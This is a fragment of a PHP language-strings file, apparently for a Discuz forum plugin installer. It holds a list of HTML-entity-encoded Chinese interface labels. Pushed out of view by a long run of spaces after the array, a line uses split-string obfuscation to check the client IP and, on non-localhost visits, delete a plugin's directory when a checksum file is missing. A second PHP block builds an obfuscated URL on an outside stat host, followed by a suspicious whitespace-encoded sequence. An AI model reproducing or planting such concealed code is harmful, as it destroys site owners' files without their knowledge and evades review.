...
$s_installlang = array(
	...
	'ilang_addon' => '&#x5E94;&#x7528;&#x63A8;&#x8350;',
	'ilang_ok' => '&#x5B8C;&#x6210;',
);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if($_G['cl'.'ient'.'ip'] != '12'.'7.0'.'.0'.'.1' && $pluginarray['plugin']['identifier']){@!file_exists(DISCUZ_ROOT.'./data/add'.'onm'.'d5/'.$pluginarray['plugin']['identifier'].'.plug'.'in.x'.'ml') && cloudaddons_cleardir(DISCUZ_ROOT.'./source/plugin/'.$pluginarray['plugin']['identifier'].'/');}
...
<?php $StatUrl = 'http'.($_G['isHTTPS'] ? 's' : '').'://addon.131'.'4study.com/stat.php';     		  	  		  	  		     	   	       		   		     		       	   	       		   		     		       	   	       		   		     		       	 	   	    		   		     		       	  			      		   		     		       	  	   	    		   		     		       	  	 	      		   		     		       	  			 	    		   		     		       	   	 		    		   		     		       	  	 	      		   		     		       	 	   	    		   		     		       	  			      		   		     		       	  	        		   		     		       	  	  	     		 	      	  		  	  		     	
?>